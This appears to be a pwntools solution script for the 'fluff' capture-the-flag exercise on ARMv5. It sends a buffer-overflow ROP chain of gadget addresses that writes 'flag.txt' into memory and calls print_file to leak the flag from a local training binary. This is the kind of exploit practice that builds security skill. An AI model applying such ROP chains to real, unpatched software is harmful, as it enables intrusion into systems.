from pwn import *

data = 0x00021024 # rw-
print_file = 0x000104b0 # plt
pop = 0x00010658 # pop {r4, r5, r6, r7, r8, sb, sl, pc}
pop_r0_r1_r3 = 0x000105ec # pop {r0, r1, r3} ; bx r1
str_r6_r5 = 0x000103ea+1 # str r6, [r5, #0x44] ; bx r0

payload = b"".join([
    b"A"*(32+4),
    p32(pop_r0_r1_r3),
    p32(pop_r0_r1_r3),
    p32(pop),
    b"B"*(4*2),
    p32(data-0x44),
    b"flag",
    b"C"*(4*4),
    p32(str_r6_r5),
    p32(pop_r0_r1_r3),
    p32(pop),
    b"D"*8,
    p32(data-0x44+4),
    b".txt",
    b"E"*(4*4),
    p32(str_r6_r5),
    p32(data),
    p32(print_file),
    b"D"*4,
])

p = process("./fluff_armv5")
#p = process(["qemu-arm", "-g", "1234", "./fluff_armv5"])
#input("Waiting for debug")
p.send(payload+b"\n")

#p.interactive()
p.recvuntil(b"you!\n")
flag = p.recv()
print(f"Flag : {flag}")
